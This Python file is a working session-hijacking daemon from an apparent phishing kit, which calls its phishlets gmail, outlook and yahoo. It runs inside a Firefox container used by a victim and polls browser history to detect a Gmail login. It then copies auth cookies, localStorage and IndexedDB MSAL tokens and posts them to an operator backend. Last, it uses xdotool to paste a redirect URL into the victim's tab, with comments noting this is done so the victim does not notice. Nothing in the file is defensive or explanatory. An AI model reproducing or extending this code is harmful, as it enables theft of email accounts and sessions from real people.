#!/usr/bin/env python3
"""Multi-phishlet URL tracker and login-redirect daemon.

Runs inside a Firefox container (one per phishlet).  Every ~2s it
asks Firefox what URL the active tab is on, classifies it as one of
    {gmail, outlook, yahoo}, reports the visit to the
backend, and once a successful login is detected (URL pattern + auth
cookies present in cookies.sqlite) it triggers a redirect to the
operator-supplied URL via xdotool.

Phishlet definitions live in PHISHLETS at the bottom of the file.
"""
import json
import os
import re
import sqlite3
import subprocess
import sys
import time
import urllib.request
import urllib.error

LOG = "/config/log/phishlet-redirector.log"
COOKIE_DB_CANDIDATES = [
    "/config/profile/cookies.sqlite",
    "/config/profile-default/cookies.sqlite",
]
BACKEND = os.environ.get("BACKEND_URL", "http://backend:8000")
POLL_INTERVAL = 2.0
NAV_TIMEOUT = 90  # seconds; stop checking if no login within this long


# ---------------------------------------------------------------------------
# Phishlet definitions
# ---------------------------------------------------------------------------
PHISHLETS = {
    "gmail": {
        "url_hosts": ("mail.google.com", "accounts.google.com"),
        "logged_in_url_re": re.compile(
            r"^https://mail\.google\.com/mail/.*"
        ),
        "auth_cookies": ("SID", "HSID", "SSID", "APISID", "SAPISID", "OSID"),
    },
    # "outlook": {
    #     "url_hosts": ("outlook.live.com", "login.live.com", "login.microsoftonline.com"),
    #     "logged_in_url_re": re.compile(
    #         r"^https://outlook\.live\.com/mail/.*"
    #     ),
    #     "auth_cookies": ("buid", "fpc", "SDIDC", "mscproper"),
    # },
    # "yahoo": {
    #     "url_hosts": ("mail.yahoo.com", "login.yahoo.com", "yahoo.com"),
    #     "logged_in_url_re": re.compile(
    #         r"^https://(mail\.|login\.)?yahoo\.com/(?!login|signup)(.*)"
    #     ),
    #     "auth_cookies": ("T", "Y"),
    # },
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def log(msg):
    try:
        os.makedirs(os.path.dirname(LOG), exist_ok=True)
        with open(LOG, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def http_get_json(path, timeout=5):
    try:
        with urllib.request.urlopen(f"{BACKEND}{path}", timeout=timeout) as r:
            return json.loads(r.read())
    except Exception as e:
        log(f"GET {path}: {e}")
        return None


def http_post_json(path, payload, timeout=5):
    try:
        body = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{BACKEND}{path}",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except Exception as e:
        log(f"POST {path} {payload}: {e}")
        return None


def find_cookie_db():
    for p in COOKIE_DB_CANDIDATES:
        if os.path.isfile(p):
            return p
    try:
        result = subprocess.run(
            ["find", "/config", "-name", "cookies.sqlite", "-type", "f", "-maxdepth", "4"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                return line
    except Exception as e:
        log(f"find cookies: {e}")
    return None


PLACES_DB_CANDIDATES = [
    "/config/profile/places.sqlite",
    "/config/profile-default/places.sqlite",
]


def find_places_db():
    for p in PLACES_DB_CANDIDATES:
        if os.path.isfile(p):
            return p
    try:
        result = subprocess.run(
            ["find", "/config", "-name", "places.sqlite", "-type", "f", "-maxdepth", "4"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                return line
    except Exception as e:
        log(f"find places: {e}")
    return None


STORAGE_DB_CANDIDATES = [
    "/config/profile/storage.sqlite",
    "/config/profile-default/storage.sqlite",
    "/config/profile/webappsstore.sqlite",
    "/config/profile-default/webappsstore.sqlite",
]


def find_storage_db():
    for p in STORAGE_DB_CANDIDATES:
        if os.path.isfile(p):
            return p
    try:
        result = subprocess.run(
            ["find", "/config", "-name", "storage.sqlite", "-type", "f", "-maxdepth", "4"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                return line
    except Exception as e:
        log(f"find storage: {e}")
    return None


MSAL_STORAGE_KEYS = {
    "outlook": [
        "msal.cache.encryption",
        "msal.accessTokens",
        "msal.idTokens",
        "msal.refreshTokens",
        "msal.accounts",
        "fptctx2",
        "WLSSC",
        "DefaultAnchorMailbox",
    ],
}


INDEXEDDB_PATTERNS = {
    "outlook": [
        "msal.",
        "fptctx2",
        "WLSSC",
        "DefaultAnchorMailbox",
    ],
}


def find_indexeddb_dirs():
    """Find all IndexedDB directories for web apps."""
    dirs = []
    try:
        storage_base = "/config/profile/storage"
        if os.path.isdir(storage_base):
            for root, subdirs, files in os.walk(storage_base):
                if "ls" in subdirs or "idb" in subdirs:
                    ls_dir = os.path.join(root, "ls")
                    if os.path.isdir(ls_dir):
                        data_db = os.path.join(ls_dir, "data.sqlite")
                        if os.path.isfile(data_db):
                            dirs.append(data_db)
    except Exception as e:
        log(f"find_indexeddb_dirs: {e}")
    return dirs


def get_msal_tokens_from_indexeddb(storage_keys=None):
    """Extract MSAL tokens from Firefox IndexedDB storage.

    Returns list of dicts in cookie-compatible format.
    """
    tokens = []
    keys = storage_keys or []
    if not keys:
        return tokens

    patterns = keys

    for indexeddb_path in find_indexeddb_dirs():
        tmp = f"/tmp/indexeddb-copy-{os.getpid()}-{os.path.basename(os.path.dirname(os.path.dirname(indexeddb_path)))}.sqlite"
        try:
            for ext in ("", "-wal", "-shm"):
                src = indexeddb_path + ext
                if os.path.isfile(src):
                    with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                        f_out.write(f_in.read())
            con = sqlite3.connect(tmp, timeout=5)
            cur = con.cursor()
            cur.execute("SELECT key, value FROM data")
            for row in cur.fetchall():
                key = row[0]
                if not key:
                    continue
                for pattern in patterns:
                    if pattern in key:
                        value = row[1]
                        if isinstance(value, memoryview):
                            value = bytes(value)
                        if isinstance(value, bytes):
                            try:
                                value = value.decode("utf-8")
                            except UnicodeDecodeError:
                                try:
                                    value = value.decode("utf-16-le", errors="replace")
                                except Exception:
                                    value = value.hex()
                        elif not isinstance(value, str):
                            value = str(value)

                        domain = "outlook.live.com"
                        if "outlook.live.com" not in key and "login.windows.net" in key:
                            domain = "login.windows.net"

                        tokens.append({
                            "name": key[:200],
                            "value": value[:10000],
                            "domain": domain,
                            "hostOnly": False,
                            "path": "/",
                            "secure": True,
                            "httpOnly": False,
                            "sameSite": "no_restriction",
                            "session": True,
                            "firstPartyDomain": "",
                            "partitionKey": None,
                            "storeId": "0",
                        })
                        break
            con.close()
        except Exception as e:
            log(f"IndexedDB read error {indexeddb_path}: {e}")
        finally:
            for ext in ("", "-wal", "-shm"):
                try:
                    os.unlink(tmp + ext)
                except OSError:
                    pass

    return tokens


def get_auth_cookies_data(cookie_db, auth_cookie_names):
    """Return list of auth cookie objects with full data.

    Returns list of dicts with: name, value, host, domain, path, expires, secure, httpOnly
    """
    if not cookie_db or not auth_cookie_names:
        return []
    tmp = f"/tmp/cookies-copy-{os.getpid()}.sqlite"
    try:
        for ext in ("", "-wal", "-shm"):
            src = cookie_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        placeholders = ",".join("?" for _ in auth_cookie_names)
        cur.execute(
            f"SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM moz_cookies WHERE name IN ({placeholders})",
            auth_cookie_names,
        )
        cookies = []
        for row in cur.fetchall():
            cookies.append({
                "name": row[0],
                "value": row[1],
                "host": row[2],
                "domain": row[2],
                "path": row[3] or "/",
                "expires": row[4] or 0,
                "secure": bool(row[5]),
                "httpOnly": bool(row[6]),
                "sameSite": "unspecified",
            })
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        return cookies
    except sqlite3.OperationalError as e:
        log(f"cookies DB read error: {e}")
        return []
    except Exception as e:
        log(f"cookies DB read error: {e}")
        return []


def check_auth_cookies(cookie_db, auth_cookie_names):
    """Return set of auth cookie names present in the cookies DB."""
    names = [c["name"] for c in get_auth_cookies_data(cookie_db, auth_cookie_names)]
    return set(names)


def get_storage_tokens(storage_db, phishlet_key):
    """Extract localStorage/sessionStorage tokens for a phishlet.

    Returns list of dicts in cookie format with: name, value, domain, etc.
    """
    if not storage_db or phishlet_key not in MSAL_STORAGE_KEYS:
        return []
    keys_to_extract = MSAL_STORAGE_KEYS[phishlet_key]
    tmp = f"/tmp/storage-copy-{os.getpid()}.sqlite"
    try:
        for ext in ("", "-wal", "-shm"):
            src = storage_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        tokens = []
        for key in keys_to_extract:
            try:
                cur.execute(
                    "SELECT json FROM storage WHERE json LIKE ?",
                    (f'%"{key}"%',),
                )
                row = cur.fetchone()
                if row:
                    data = json.loads(row[0])
                    if key in data:
                        value = data[key]
                        if isinstance(value, dict):
                            value = json.dumps(value)
                        elif not isinstance(value, str):
                            value = str(value)
                        tokens.append({
                            "name": key,
                            "value": value,
                            "domain": f".{phishlet_key}.localStorage",
                            "hostOnly": False,
                            "path": "/",
                            "secure": True,
                            "httpOnly": False,
                            "sameSite": "no_restriction",
                            "session": True,
                            "firstPartyDomain": "",
                            "partitionKey": None,
                            "storeId": "0",
                        })
            except Exception as e:
                log(f"storage key {key} error: {e}")
                continue
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        return tokens
    except Exception as e:
        log(f"storage DB read error: {e}")
        return []


STORAGE_KEYS_TO_EXTRACT = [
    "msal.cache.encryption",
    "msal.accessTokens",
    "msal.idTokens",
    "msal.refreshTokens",
    "msal.accounts",
    "fptctx2",
    "WLSSC",
    "DefaultAnchorMailbox",
]


def get_storage_tokens_v2(storage_db, storage_keys=None):
    """Extract localStorage/sessionStorage tokens from Firefox storage.sqlite.

    Returns list of dicts in cookie-compatible format.
    """
    if not storage_db:
        return []
    keys = storage_keys or STORAGE_KEYS_TO_EXTRACT
    tmp = f"/tmp/storage-copy-{os.getpid()}.sqlite"
    try:
        for ext in ("", "-wal", "-shm"):
            src = storage_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        tokens = []
        try:
            cur.execute("SELECT origin_attributes, json FROM storage")
            for row in cur.fetchall():
                origin = row[0] or ""
                try:
                    data = json.loads(row[1])
                    for key in keys:
                        if key in data:
                            value = data[key]
                            if isinstance(value, dict):
                                value = json.dumps(value)
                            elif not isinstance(value, str):
                                value = str(value)
                            domain = origin if origin.startswith("https://") else f"https://{origin}"
                            tokens.append({
                                "name": key,
                                "value": value,
                                "domain": domain,
                                "hostOnly": False,
                                "path": "/",
                                "secure": True,
                                "httpOnly": False,
                                "sameSite": "no_restriction",
                                "session": True,
                                "firstPartyDomain": "",
                                "partitionKey": None,
                                "storeId": "0",
                            })
                except json.JSONDecodeError:
                    continue
        except sqlite3.OperationalError:
            pass
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        return tokens
    except Exception as e:
        log(f"storage DB read error: {e}")
        return []


def get_current_url(places_db):
    """Read the current Firefox URL from the history DB (places.sqlite).

    We can't use xdotool/Ctrl-L because it steals focus from the user.
    Firefox 145 doesn't expose a Chrome-style /json endpoint over its
    remote-debugging-port.  The cleanest non-intrusive option is to read
    moz_places.moz_historyvisits, which Firefox updates on every
    navigation.  For a single-victim kiosk container, the most-recent
    visit is the current tab.
    """
    if not places_db:
        return None
    tmp = f"/tmp/places-copy-{os.getpid()}-{int(time.time())}.sqlite"
    try:
        for ext in ("", "-wal", "-shm"):
            src = places_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        # Most recent navigation's URL
        try:
            cur.execute("""
                SELECT p.url
                FROM moz_historyvisits v
                JOIN moz_places p ON p.id = v.place_id
                WHERE p.url LIKE 'http%'
                ORDER BY v.id DESC
                LIMIT 1
            """)
            row = cur.fetchone()
        except sqlite3.OperationalError as e:
            # Schema not yet populated (Firefox hasn't visited anything)
            row = None
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        if row:
            return row[0]
    except sqlite3.OperationalError as e:
        log(f"places DB read error: {e}")
    except Exception as e:
        log(f"places DB read error: {e}")
    return None


def classify_url(url):
    """Return phishlet key if URL matches one of the PHISHLETS, else None."""
    if not url:
        return None
    for key, cfg in PHISHLETS.items():
        for host in cfg["url_hosts"]:
            if host in url:
                return key
    return None


def is_logged_in(phishlet_key, url, auth_present):
    if not auth_present:
        return False
    if not url:
        return False
    return bool(PHISHLETS[phishlet_key]["logged_in_url_re"].match(url))


def get_redirect_url(phishlet_key):
    data = http_get_json(f"/api/phishlets/redirect-url?key={phishlet_key}")
    if data and data.get("url"):
        return data["url"]
    return os.environ.get("REDIRECT_URL", "").strip() or None


def send_visit(phishlet_key, url):
    http_post_json(
        "/api/phishlets/visit",
        {"phishletKey": phishlet_key, "currentUrl": url},
    )


def send_login_detected(phishlet_key, url, cookies, storage_tokens=None):
    http_post_json(
        "/api/phishlets/login-detected",
        {
            "phishletKey": phishlet_key,
            "currentUrl": url,
            "cookies": cookies,
            "storageTokens": storage_tokens or [],
        },
    )


def navigate(url):
    """Navigate the current Firefox tab to the redirect URL via xdotool.

    Uses clipboard paste instead of typing so the victim never sees
    the URL being entered character-by-character in the address bar.
    """
    try:
        result = subprocess.run(
            ["xdotool", "search", "--class", "firefox"],
            capture_output=True, text=True, timeout=5,
        )
        wids = [w for w in result.stdout.split() if w]
        if not wids:
            log("navigate: no Firefox window")
            return False
        wid = wids[-1]
        subprocess.run(["xdotool", "windowactivate", "--sync", wid], timeout=5)
        time.sleep(0.1)
        # Put the URL into the clipboard, then paste it instantly
        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+l"], timeout=3)
        time.sleep(0.1)
        subprocess.run(["xclip", "-selection", "clipboard"], input=url.encode(), timeout=3)
        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+v"], timeout=3)
        time.sleep(0.1)
        subprocess.run(["xdotool", "key", "--clearmodifiers", "Return"], timeout=3)
        log(f"navigate: redirected current tab to {url}")
        return True
    except Exception as e:
        log(f"navigate error: {e}")
        return False


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------
def main():
    log(f"phishlet-redirector starting (backend={BACKEND})")
    cookie_db = None
    for _ in range(60):
        cookie_db = find_cookie_db()
        if cookie_db:
            break
        time.sleep(1)
    if not cookie_db:
        log("cookies.sqlite not found, exiting")
        sys.exit(1)
    log(f"using cookies DB: {cookie_db}")

    places_db = find_places_db()
    if places_db:
        log(f"using places DB: {places_db}")
    else:
        log("places.sqlite not found yet - will keep looking")

    storage_db = find_storage_db()
    if storage_db:
        log(f"using storage DB: {storage_db}")
    else:
        log("storage.sqlite not found yet - will keep looking")

    last_url = {}
    last_logged_in = {}
    redirected = {}  # tracks if we've successfully redirected each phishlet
    started = time.time()

    while True:
        if not places_db:
            places_db = find_places_db()
            if places_db:
                log(f"places DB now available: {places_db}")
        if not storage_db:
            storage_db = find_storage_db()
            if storage_db:
                log(f"storage DB now available: {storage_db}")
        url = get_current_url(places_db)
        phishlet_key = classify_url(url)
        if phishlet_key:
            cfg = PHISHLETS[phishlet_key]
            auth = check_auth_cookies(cookie_db, cfg["auth_cookies"])
            logged_in = is_logged_in(phishlet_key, url, auth)
            prev_url = last_url.get(phishlet_key)
            prev_logged_in = last_logged_in.get(phishlet_key, False)

            if url != prev_url:
                log(f"[{phishlet_key}] visit {url} auth={sorted(auth)}")
                send_visit(phishlet_key, url)
                last_url[phishlet_key] = url

            if logged_in and not prev_logged_in:
                log(f"[{phishlet_key}] LOGIN detected at {url}")
                send_visit(phishlet_key, url)
                cookies = get_auth_cookies_data(cookie_db, cfg["auth_cookies"])
                storage_tokens = get_storage_tokens_v2(storage_db, STORAGE_KEYS_TO_EXTRACT)
                indexeddb_tokens = get_msal_tokens_from_indexeddb(INDEXEDDB_PATTERNS.get(phishlet_key, []))
                all_tokens = storage_tokens + indexeddb_tokens
                if cookies or all_tokens:
                    send_login_detected(phishlet_key, url, cookies, all_tokens)
                redirected[phishlet_key] = False

            if not logged_in and prev_logged_in:
                redirected[phishlet_key] = False  # reset redirect state on logout

            if logged_in and not redirected.get(phishlet_key, False):
                target = get_redirect_url(phishlet_key)
                if target:
                    success = navigate(target)
                    if success:
                        log(f"[{phishlet_key}] redirected current tab to {target}")
                        redirected[phishlet_key] = True
                    else:
                        log(f"[{phishlet_key}] redirect failed (will retry)")
                else:
                    log(f"[{phishlet_key}] no redirect URL configured")
                    redirected[phishlet_key] = True  # don't retry if no URL configured

            last_logged_in[phishlet_key] = logged_in
        else:
            # Not a phishlet URL (maybe about:config, blank tab, etc.) - skip
            pass

        if time.time() - started > NAV_TIMEOUT:
            # Reset timer so we keep monitoring if a new session starts
            started = time.time()

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        log(f"FATAL: {e}")
        sys.exit(1)
